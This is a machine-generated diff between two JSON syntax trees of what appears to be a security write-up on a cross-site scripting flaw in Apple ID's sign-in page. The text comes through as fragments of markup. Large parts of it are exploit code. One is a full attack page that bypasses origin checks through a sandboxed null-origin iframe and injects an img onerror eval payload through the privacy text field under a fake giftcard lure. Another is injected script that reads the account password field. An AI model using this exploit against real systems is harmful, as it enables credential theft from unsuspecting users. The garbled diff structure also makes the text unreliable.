document.querySelector(\"#accountpassword\").value\n            }`);\n        });\n\n        // once initialized, post to the page that created\n        // us that it can close now.\n        window.opener.postMessage(\"CLOSE\", \"*\");\n        }\n\n        // get a reference to the document of the popped out\n        // window and inject the attack code we just defined.\n        const doc = myWnd.document;\n        const s = (doc.body || doc.documentElement).appendChild(\n        doc.createElement.call(doc, \"script\")\n        );\n        s.innerHTML = `(${toInject})()`;\n    }, 100);\n    });\n\n    // this is awful. do not do this.\n    // it's a really quick way to clear a page of content though :)\n    document.body.innerHTML = \"\";\n\n    // and finally, add the button which will kick it all off\n    document.body.appendChild(i);\n}",
20310,20312c21995,21997
<                   "line": 1080,
<                   "column": 176,
<                   "offset": 56316
---
>                   "line": 1454,
>                   "column": 1,
>                   "offset": 71962
20315,20317c22000,22002
<                   "line": 1080,
<                   "column": 181,
<                   "offset": 56321
---
>                   "line": 1548,
>                   "column": 4,
>                   "offset": 75955
20319c22004,22099
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
20321,20730d22100
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1080,
<               "column": 175,
<               "offset": 56315
<             },
<             "end": {
<               "line": 1080,
<               "column": 182,
<               "offset": 56322
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " use. If they're not used, then it's much less likely someone has looked at them and thought about security. There's quite a few:",
<           "position": {
<             "start": {
<               "line": 1080,
<               "column": 182,
<               "offset": 56322
<             },
<             "end": {
<               "line": 1080,
<               "column": 311,
<               "offset": 56451
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1080,
<           "column": 1,
<           "offset": 56141
<         },
<         "end": {
<           "line": 1080,
<           "column": 311,
<           "offset": 56451
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "javascript",
<       "meta": null,
<       "value": "this.attr(\"testIdpButtonText\", d()(w.a, \"envConfigFromConsumer.testIdpButtonText\", \"Test\"))\n\nd()(w.a, \"envConfigFromConsumer.accountName\", \"\").trim() ? (n.attr(\"accountName\", w.a.envConfigFromConsumer.accountName.trim()),\n\nn.attr(\"showCreateLink\", d()(w.a, \"envConfigFromConsumer.features.createLink\", !0)),\n\nn.attr(\"showiForgotLink\", d()(w.a, \"envConfigFromConsumer.features.iForgotLink\", !0)),\n\nn.attr(\"learnMoreLink\", d()(w.a, \"envConfigFromConsumer.learnMoreLink\", void 0)),\n\nn.attr(\"privacyText\", d()(w.a, \"envConfigFromConsumer.privacy\", void 0)),\n\nn.attr(\"showFooter\", d()(w.a, \"envConfigFromConsumer.features.footer\", !1)),\n\nn.attr(\"showRememberMe\") && (\"remember-me\" === d()(w.a, \"envConfigFromConsumer.rememberMeLabel\", \"\").trim() ? n.attr(\"rememberMeText\", l.a.getString(\"rememberMe\")) : \"keep-me-signed-in\" === d()(w.a, \"envConfigFromConsumer.rememberMeLabel\", \"\").trim() && n.attr(\"rememberMeText\", l.a.getString(\"keepMeSignedIn\")),\n\nn.attr(\"isRememberMeChecked\", !!d()(w.a, \"envConfigFromConsumer.features.selectRememberMe\", !1) || !!d()(w.a, \"accountName\", \"\").trim())),\n\ni = d()(w.a, \"envConfigFromConsumer.verificationToken\", \"\"),",
<       "position": {
<         "start": {
<           "line": 1082,
<           "column": 1,
<           "offset": 56455
<         },
<         "end": {
<           "line": 1102,
<           "column": 4,
<           "offset": 57640
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "It's going to be super annoying to test every one of these. If we dig a bit deeper, we can observe that for many of these there are two ways to reference these configuration options. At configuration time, in the configuration we send we refer to many of these by different names than what they're use as later. For example, ",
<           "position": {
<             "start": {
<               "line": 1104,
<               "column": 1,
<               "offset": 57644
<             },
<             "end": {
<               "line": 1104,
<               "column": 326,
<               "offset": 57969
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "rememberMeLabel",
<           "position": {
<             "start": {
<               "line": 1104,
<               "column": 326,
<               "offset": 57969
<             },
<             "end": {
<               "line": 1104,
<               "column": 343,
<               "offset": 57986
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " actually becomes ",
<           "position": {
<             "start": {
<               "line": 1104,
<               "column": 343,
<               "offset": 57986
<             },
<             "end": {
<               "line": 1104,
<               "column": 361,
<               "offset": 58004
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "rememberMeText",
<           "position": {
<             "start": {
<               "line": 1104,
<               "column": 361,
<               "offset": 58004
<             },
<             "end": {
<               "line": 1104,
<               "column": 377,
<               "offset": 58020
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". If we look for that, we can find the sink that puts it onto the page.",
<           "position": {
<             "start": {
<               "line": 1104,
<               "column": 377,
<               "offset": 58020
<             },
<             "end": {
<               "line": 1104,
<               "column": 448,
<               "offset": 58091
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1104,
<           "column": 1,
<           "offset": 57644
<         },
<         "end": {
<           "line": 1104,
<           "column": 448,
<           "offset": 58091
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Oddly, if we do a regular search via the 'search' panel, the only hits we get are in ",
<           "position": {
<             "start": {
<               "line": 1106,
<               "column": 1,
<               "offset": 58095
<             },
<             "end": {
<               "line": 1106,
<               "column": 86,
<               "offset": 58180
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "app.js",
<           "position": {
<             "start": {
<               "line": 1106,
<               "column": 86,
<               "offset": 58180
<             },
<             "end": {
<               "line": 1106,
<               "column": 94,
<               "offset": 58188
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " which doesn't actually appear to perform the action of rendering these parameters onto the page. This probably means that these config options are rendered by some externally defined template.",
<           "position": {
<             "start": {
<               "line": 1106,
<               "column": 94,
<               "offset": 58188
<             },
<             "end": {
<               "line": 1106,
<               "column": 287,
<               "offset": 58381
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1106,
<           "column": 1,
<           "offset": 58095
<         },
<         "end": {
<           "line": 1106,
<           "column": 287,
<           "offset": 58381
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "If we go to our 'Network' panel and do a search of all network requests for 'rememberMeText' we strike gold; the templates are defined in ",
<           "position": {
<             "start": {
<               "line": 1108,
<               "column": 1,
<               "offset": 58385
<             },
<             "end": {
<               "line": 1108,
<               "column": 139,
<               "offset": 58523
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "signin",
<           "position": {
<             "start": {
<               "line": 1108,
<               "column": 139,
<               "offset": 58523
<             },
<             "end": {
<               "line": 1108,
<               "column": 147,
<               "offset": 58531
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " (the HTML page) itself.",
<           "position": {
<             "start": {
<               "line": 1108,
<               "column": 147,
<               "offset": 58531
<             },
<             "end": {
<               "line": 1108,
<               "column": 171,
<               "offset": 58555
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1108,
<           "column": 1,
<           "offset": 58385
<         },
<         "end": {
<           "line": 1108,
<           "column": 171,
<           "offset": 58555
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "HTML",
<       "meta": null,
<       "value": "{{#if showRememberMe}}\n<div class=\"si-remember-password\">\n    <input type=\"checkbox\" id=\"remember-me\" class=\"form-choice form-choice-checkbox\" {($checked)}=\"isRememberMeChecked\">\n    <label id=\"remember-me-label\" class=\"form-label\" for=\"remember-me\">\n    <span class=\"form-choice-indicator\"></span>\n    {{rememberMeText}}\n    </label>\n</div>\n{{/if}}",
<       "position": {
<         "start": {
<           "line": 1110,
<           "column": 1,
<           "offset": 58559
<         },
<         "end": {
<           "line": 1120,
<           "column": 4,
<           "offset": 58930
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "This is a Handlebars template. It's kinda funny to see a handlebars template in 2019. Handlebars.js was one of the first 'Web 2.0' libraries. If you look up its website it's full of 2010s design choices -- soft rounded corners and lots of negative space. Things that were only just becoming possible with modern CSS.",
<           "position": {
<             "start": {
<               "line": 1122,
<               "column": 1,
<               "offset": 58934
<             },
<             "end": {
<               "line": 1122,
<               "column": 317,
<               "offset": 59250
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1122,
<           "column": 1,
<           "offset": 58934
<         },
<         "end": {
<           "line": 1122,
<           "column": 317,
<           "offset": 59250
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Handlebars templates pre-date 'taint' based HTML escaping. If you use, say, Go's HTML templating system your injected content will ",
<           "position": {
<             "start": {
<               "line": 1124,
<               "column": 1,
<               "offset": 59254
<             },
<             "end": {
<               "line": 1124,
<               "column": 132,
<               "offset": 59385
20732,20737d22101
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
20739,20740c22103,22122
<               "type": "text",
<               "value": "always",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "We also make this minor change to our 'message' listener to destroy ourselves after the attack completes:",
>                   "position": {
>                     "start": {
>                       "line": 1550,
>                       "column": 1,
>                       "offset": 75959
>                     },
>                     "end": {
>                       "line": 1550,
>                       "column": 106,
>                       "offset": 76064
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
20743,20745c22125,22127
<                   "line": 1124,
<                   "column": 133,
<                   "offset": 59386
---
>                   "line": 1550,
>                   "column": 1,
>                   "offset": 75959
20748,20750c22130,22132
<                   "line": 1124,
<                   "column": 139,
<                   "offset": 59392
---
>                   "line": 1550,
>                   "column": 106,
>                   "offset": 76064
20754,21150d22135
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1124,
<               "column": 132,
<               "offset": 59385
<             },
<             "end": {
<               "line": 1124,
<               "column": 140,
<               "offset": 59393
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " be safely escaped away unless you explicitly whitelist the input by asserting the string as a ",
<           "position": {
<             "start": {
<               "line": 1124,
<               "column": 140,
<               "offset": 59393
<             },
<             "end": {
<               "line": 1124,
<               "column": 235,
<               "offset": 59488
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "template.HTML()",
<           "position": {
<             "start": {
<               "line": 1124,
<               "column": 235,
<               "offset": 59488
<             },
<             "end": {
<               "line": 1124,
<               "column": 252,
<               "offset": 59505
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " type.",
<           "position": {
<             "start": {
<               "line": 1124,
<               "column": 252,
<               "offset": 59505
<             },
<             "end": {
<               "line": 1124,
<               "column": 258,
<               "offset": 59511
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1124,
<           "column": 1,
<           "offset": 59254
<         },
<         "end": {
<           "line": 1124,
<           "column": 258,
<           "offset": 59511
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Handlebars decides whether to safely escape content or not based on the number of 'handlebars' around the input, which is a fantastic way to make it really easy for machines to determine if you messed up, but very difficult for human software engineers.",
<           "position": {
<             "start": {
<               "line": 1126,
<               "column": 1,
<               "offset": 59515
<             },
<             "end": {
<               "line": 1126,
<               "column": 254,
<               "offset": 59768
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1126,
<           "column": 1,
<           "offset": 59515
<         },
<         "end": {
<           "line": 1126,
<           "column": 254,
<           "offset": 59768
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "A safe handlebars template string looks like ",
<           "position": {
<             "start": {
<               "line": 1128,
<               "column": 1,
<               "offset": 59772
<             },
<             "end": {
<               "line": 1128,
<               "column": 46,
<               "offset": 59817
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "{{rememberMeLabel}}",
<           "position": {
<             "start": {
<               "line": 1128,
<               "column": 46,
<               "offset": 59817
<             },
<             "end": {
<               "line": 1128,
<               "column": 67,
<               "offset": 59838
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " and a potentially catastrophically unsafe one looks like ",
<           "position": {
<             "start": {
<               "line": 1128,
<               "column": 67,
<               "offset": 59838
<             },
<             "end": {
<               "line": 1128,
<               "column": 125,
<               "offset": 59896
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "{{{rememberMeLabel}}}",
<           "position": {
<             "start": {
<               "line": 1128,
<               "column": 125,
<               "offset": 59896
<             },
<             "end": {
<               "line": 1128,
<               "column": 148,
<               "offset": 59919
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". That's kinda hard to notice!",
<           "position": {
<             "start": {
<               "line": 1128,
<               "column": 148,
<               "offset": 59919
<             },
<             "end": {
<               "line": 1128,
<               "column": 178,
<               "offset": 59949
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1128,
<           "column": 1,
<           "offset": 59772
<         },
<         "end": {
<           "line": 1128,
<           "column": 178,
<           "offset": 59949
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "A quick and simple ctrl-f in the ",
<           "position": {
<             "start": {
<               "line": 1130,
<               "column": 1,
<               "offset": 59953
<             },
<             "end": {
<               "line": 1130,
<               "column": 34,
<               "offset": 59986
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "signin",
<           "position": {
<             "start": {
<               "line": 1130,
<               "column": 34,
<               "offset": 59986
<             },
<             "end": {
<               "line": 1130,
<               "column": 42,
<               "offset": 59994
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " HTML gets us this:",
<           "position": {
<             "start": {
<               "line": 1130,
<               "column": 42,
<               "offset": 59994
<             },
<             "end": {
<               "line": 1130,
<               "column": 61,
<               "offset": 60013
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1130,
<           "column": 1,
<           "offset": 59953
<         },
<         "end": {
<           "line": 1130,
<           "column": 61,
<           "offset": 60013
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "HTML",
<       "meta": null,
<       "value": "<p class=\"sr-only\" id=\"invalidUserNamePwdErrMsg\" role=\"tooltip\">\n    {{{errorMessage}}}\n</p>\n</div>",
<       "position": {
<         "start": {
<           "line": 1132,
<           "column": 1,
<           "offset": 60017
<         },
<         "end": {
<           "line": 1137,
<           "column": 4,
<           "offset": 60133
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "First hit is not so promising. The error message is unescaped, sure but they're usually generated from either a static, hard-coded list of HTML error strings, or something returned from a server we can't manipulate.",
<           "position": {
<             "start": {
<               "line": 1139,
<               "column": 1,
<               "offset": 60137
<             },
<             "end": {
<               "line": 1139,
<               "column": 216,
<               "offset": 60352
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1139,
<           "column": 1,
<           "offset": 60137
<         },
<         "end": {
<           "line": 1139,
<           "column": 216,
<           "offset": 60352
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "HTML",
<       "meta": null,
<       "value": "    {{#if showLearnMoreLink}}\n    <div>\n        {{{learnMoreLink}}}\n    </div>\n    {{/if}}\n    {{#if showPrivacy}}\n    <div  class=\"label-small text-centered centered tk-caption privacy-wrapper\">\n            <div class=\"privacy-icon\"></div>\n            {{{privacyText}}} \n    </div>\n    {{/if}}",
<       "position": {
<         "start": {
<           "line": 1141,
<           "column": 1,
<           "offset": 60356
<         },
<         "end": {
<           "line": 1153,
<           "column": 4,
<           "offset": 60674
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Oh now this looks ",
<           "position": {
<             "start": {
<               "line": 1155,
<               "column": 1,
<               "offset": 60678
<             },
<             "end": {
<               "line": 1155,
<               "column": 19,
<               "offset": 60696
21152,21157d22136
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
21159,21160c22138,22141
<               "type": "text",
<               "value": "really",
---
>               "type": "code",
>               "lang": "javascript",
>               "meta": null,
>               "value": "      if (e.data == \"CLOSE\") window.location.replace(\"https://apple.com\")",
21163,21165c22144,22146
<                   "line": 1155,
<                   "column": 20,
<                   "offset": 60697
---
>                   "line": 1552,
>                   "column": 1,
>                   "offset": 76068
21168,21170c22149,22151
<                   "line": 1155,
<                   "column": 26,
<                   "offset": 60703
---
>                   "line": 1554,
>                   "column": 4,
>                   "offset": 76161
21172c22153,22156
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1
>                 ]
21176,22174c22160,22161
<           "position": {
<             "start": {
<               "line": 1155,
<               "column": 19,
<               "offset": 60696
<             },
<             "end": {
<               "line": 1155,
<               "column": 27,
<               "offset": 60704
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " good! From our previous code we already know that ",
<           "position": {
<             "start": {
<               "line": 1155,
<               "column": 27,
<               "offset": 60704
<             },
<             "end": {
<               "line": 1155,
<               "column": 78,
<               "offset": 60755
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "privacyText",
<           "position": {
<             "start": {
<               "line": 1155,
<               "column": 78,
<               "offset": 60755
<             },
<             "end": {
<               "line": 1155,
<               "column": 91,
<               "offset": 60768
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is derived from ",
<           "position": {
<             "start": {
<               "line": 1155,
<               "column": 91,
<               "offset": 60768
<             },
<             "end": {
<               "line": 1155,
<               "column": 108,
<               "offset": 60785
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "envConfigFromConsumer.privacy",
<           "position": {
<             "start": {
<               "line": 1155,
<               "column": 108,
<               "offset": 60785
<             },
<             "end": {
<               "line": 1155,
<               "column": 139,
<               "offset": 60816
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". Same for ",
<           "position": {
<             "start": {
<               "line": 1155,
<               "column": 139,
<               "offset": 60816
<             },
<             "end": {
<               "line": 1155,
<               "column": 150,
<               "offset": 60827
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "learnMoreLink",
<           "position": {
<             "start": {
<               "line": 1155,
<               "column": 150,
<               "offset": 60827
<             },
<             "end": {
<               "line": 1155,
<               "column": 165,
<               "offset": 60842
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ", but there's no need to try ",
<           "position": {
<             "start": {
<               "line": 1155,
<               "column": 165,
<               "offset": 60842
<             },
<             "end": {
<               "line": 1155,
<               "column": 194,
<               "offset": 60871
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "learnMoreLink",
<           "position": {
<             "start": {
<               "line": 1155,
<               "column": 194,
<               "offset": 60871
<             },
<             "end": {
<               "line": 1155,
<               "column": 209,
<               "offset": 60886
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " if ",
<           "position": {
<             "start": {
<               "line": 1155,
<               "column": 209,
<               "offset": 60886
<             },
<             "end": {
<               "line": 1155,
<               "column": 213,
<               "offset": 60890
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "privacyText",
<           "position": {
<             "start": {
<               "line": 1155,
<               "column": 213,
<               "offset": 60890
<             },
<             "end": {
<               "line": 1155,
<               "column": 226,
<               "offset": 60903
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " already works.",
<           "position": {
<             "start": {
<               "line": 1155,
<               "column": 226,
<               "offset": 60903
<             },
<             "end": {
<               "line": 1155,
<               "column": 241,
<               "offset": 60918
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1155,
<           "column": 1,
<           "offset": 60678
<         },
<         "end": {
<           "line": 1155,
<           "column": 241,
<           "offset": 60918
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Let's put everything together into one attack page.",
<           "position": {
<             "start": {
<               "line": 1157,
<               "column": 1,
<               "offset": 60922
<             },
<             "end": {
<               "line": 1157,
<               "column": 52,
<               "offset": 60973
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1157,
<           "column": 1,
<           "offset": 60922
<         },
<         "end": {
<           "line": 1157,
<           "column": 52,
<           "offset": 60973
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "code",
<       "lang": "HTML",
<       "meta": "CodeCommentHelper=//",
<       "value": "<!DOCTYPE HTML>\n//\n<title>Apple Rewards</title>\n<style type=\"text/css\">\n\n// First, we \n// clear up any gives that there's\n// something going on by making\n// the Apple ID frame fill\n// the whole page with no border\n.idmsa-frame {\n    width: 100vw;\n    height: 100vh;\n    border: 0;\n}\n\n</style>\n\n<script>\n\n// Next, the null origin allows us to bypass\n// Apple ID's postMessage controls.\n// This function takes some code, and\n// runs it in the null origin.\nconst runAsNull = code => {\n    const i = document.createElement(\n        \"iframe\"\n    );\n\n    // We apply 'sandbox=allow-scripts'\n    // to the iframe. Enabling sandboxing\n    // makes our page have the 'null' origin\n    // we need to bypass Apple ID's recieve\n    // postMessage controls.\n    i.setAttribute(\n        \"sandbox\",\n        \"allow-scripts\"\n    );\n\n    // Then, we create an HTML document inside our sandboxed iframe\n    // containing our javascript code.\n    //\n    // Those backtick quotes (`) are just multi-line\n    // quote marks by the way.\n    i.setAttribute(\n        \"srcdoc\",\n        `<!DOCTYPE HTML>\n<title>null origin</title>\n<body><script>(${javascriptCode})()<\\/script></body>\n    `);\n\n\n    // Appends our iframe child, which we called 'i'\n    // to the page's '<body>' element, and gets a handle\n    // on the window the browser made inside the iframe.\n    return document.body\n        .appendChild(i).contentWindow;\n}\n\n\n// This is the code we want to inject into idmsa.apple.com.\n// For now, it's just a pop-up box that says the domain\n// that it's running in.\n//\n// Domains and origins are the fundamental primitives of web\n// security, so if we can open a popup showing 'idmsa.apple.com',\n// we prove to ourselves that we've compromised Apple ID.\nconst injection = () => {\n    alert(document.domain);\n}\n\n\n// This is the page we're embedding and attacking. It needs\n// a bunch of parmeters to work, but we'll probably want\n// to reference those parameters a few times\n// so it's easier to define the components of the URL separately.\nconst idmsa_base =\n    \"https://idmsa.apple.com/appleauth/auth/authorize/signin\";\n\n// Here are the parameters we're using against idmsa_base.\n// defining them like this instead of one long URL\n// makes it easier to programmatically alter these parameters\n// if need to to work on our attack.\nconst idmsa_params = {\n    client_id: \"d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d\",\n\n    // Here, the redirect_uri's ? is pre-urlencoded as mentioned\n    // in previous chapters. This causes it to be misinterpreted\n    // by different parts of the system.\n    redirect_uri: `https://s3-eu-west-1.amazonaws.com${encodeURIComponent(\"?\")} s3-eu-west-1.amazonaws.com;@www.icloud.com`,\n    response_mode: \"web_message\",\n    \n    // I thought it might be possible that this frame_id\n    // needed to change per-request, but it doesn't\n    // so we can just hard code it :)\n    frame_id: \"9d8dafd2-0f8c-4901-ab87-7021ffa6f7ff\",\n    locale: \"en_GB\"\n}\n\n// let's make the idmsa frame.\nconst idmsa_frame = document.createElement(\"iframe\");\n\n// to inherit our CSS class from before\nidmsa_frame.setAttribute(\"class\", \"idmsa\");\n\n// this builds the idmsa url. I apologise for the way I build\n// the url encoding stuff. it reads fine to me but uses\n// a bunch of higher-level javascript concepts that\n// might not make a  whole lot of sense.\nidmsa_frame.src = `${idmsa_base}?${\n    Object.entries(idmsa_params)\n        .map(([key, value]) => \n            [key, value].map(encodeURIComponent).join(\"=\"))\n        .join(\"&\")\n}`;\n\n// our null page needs to:\n//   1.  Wait for a config, and remember it\n//   2. Forward all subsequent postMessages to\n//   idmsa.apple.com.\nconst nullPageCode = () => {\n    // async functions can wait on asynchronous events.\n    // since we're waiting n a bunch of asynchronous\n    // stuff to happen it only makes sense.\n    async function main() {\n        // tell our parent we're ready.\n        // the onLoad events for iframes have always\n        // been finickity. Waiting on a postMessage\n        // is much easier.\n        window.parent.postMessage(\"ready\", \"*\");\n\n        // await lets us wait for events that might\n        // happen in the future before continuing.\n        // we don't want to do anything before we\n        // get the config anyway.\n        //\n        // Promises make fantastic adaptors for turning\n        // old style callbacks into async code.\n        const config = await new Promise((ok, fail) => {\n            console.log(\"waiting for config\");\n            \n            // postMessage's event is just called 'message'\n            // i dont really know why.\n            window.addEventListener('message', ({data}) => {\n                console.log(\"got config message\");\n\n                // honestly receiving the wrong postMessage\n                // can happen pretty easily so it's worth\n                // guarding for to save some painful debug\n                // time.\n                if (data.type != config)\n                    reutrn fail(`did not get config, instead got ${JSON.stringify(data)})`);\n                \n                // this completes the promise.\n                return ok(data);\n            // eventListeners default to firing on all\n            // events but everything would probably break\n            // if we did that with this function.\n            }, { once: true });\n        });\n\n        // extract the idmsaFrameId (of window.top.frames)\n        // for later use.\n        const {idmsaFrameId} = config;\n\n        // now the easy part. we just forward everything\n        // to the idmsa page.\n        window.addEventListener(\"message\", ({data}) => {\n            console.log(\"forwarding to idmsa\", data);\n\n\n            // ordinarily \"*\" would be a bad idea, but because\n            // *we* are the bad guys we don't need to give a\n            // shit about secure coding practices.\n            window.top.frames[idmsaFrameId].postMessage(data, \"*\");\n        });\n\n        // this is just how you execute an async function\n        // without making javascript annoyed at you.\n        main().catch(e => console.error(e));\n    }\n}\n\n\n// next we'll build our config.\n// we're going to go for an <img src=a onerror> XSS,\n// the reason being that due to a totally ineffectual\n// and super old attempt at global XSS mitigation,\n// we can't inject <script> tags and have them\n// run after the page's first load, which will\n// have fired by this time. This is a bypass.\n//\n// We also btoa (base64 encode) our injection code\n// for transit across the postMessage boundary.\n// this is mainly because managing quotation marks\n// in our HTML injection gets really confusing otherwise,\n// since we're already using ' and \" in our <img> code --\n// if these were present in our injection code string, the\n// code would break.\nconst injectionHTML = `<img src=a onerror='eval(atob(\"${\n    bota(`(${injection})()`)\n}\"))' />`;\n\n\n// stolen directly from the known good conversation we eavesdropped on.\n// \"src\" is not actually \"[img src]\" but a good 8000 characters of\n// base64 encoded image data\n// which I omit so as to not make this unreadable.\nconst config_resp = { \"jsonrpc\": \"2.0\", \"id\": \"69B33E61-79C4-4A52-9522-63F273B7C349\", \"result\": { \"data\": { \"features\": { \"rememberMe\": true, \"createLink\": false, \"iForgotLink\": true, \"pause2FA\": false }, \"signInLabel\": \"Sign in to get your free Apple giftcard!\", \"serviceKey\": \"d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d\", \"defaultAccountNameAutoFillDomain\": \"icloud.com\", \"trustTokens\": [], \"rememberMeLabel\": \"keep-me-signed-in\", \"privacy\": injectionHTML, \"theme\": \"dark\", \"waitAnimationOnAuthComplete\": false, \"logo\": { \"src\": \"[img src]\", \"width\": \"100px;color:red\" } } } };\n\n\n// add the null page iframe too our page.\nconst nullPage = runFunctionInNullOrigin(nullPageCode);\n\n// determine which frame is the idmsa frame.\nlet idmsaFrameId;\n\n// there's probably a more elegant way to find what\n// index the idmsa frame is on window.top.frames, but\n// these APIs are so ancient I don't really want to fuck\n// with them and spend ages working out why they won't work.\nfor (let i = 0; i < window.top.frames.length; i++) {\n    if (window.top.frames[i] != idmsa.contentWindow) continue;\n    ifmsaFrameId = i;\n    break\n}\n\n\nwindow.addEventListener(\"message\", e => {\n    console.log(\"RCV\", e);\n\n    // we need to wait for the null page to postMessage\n    // us to tell us it exists. This way of doing 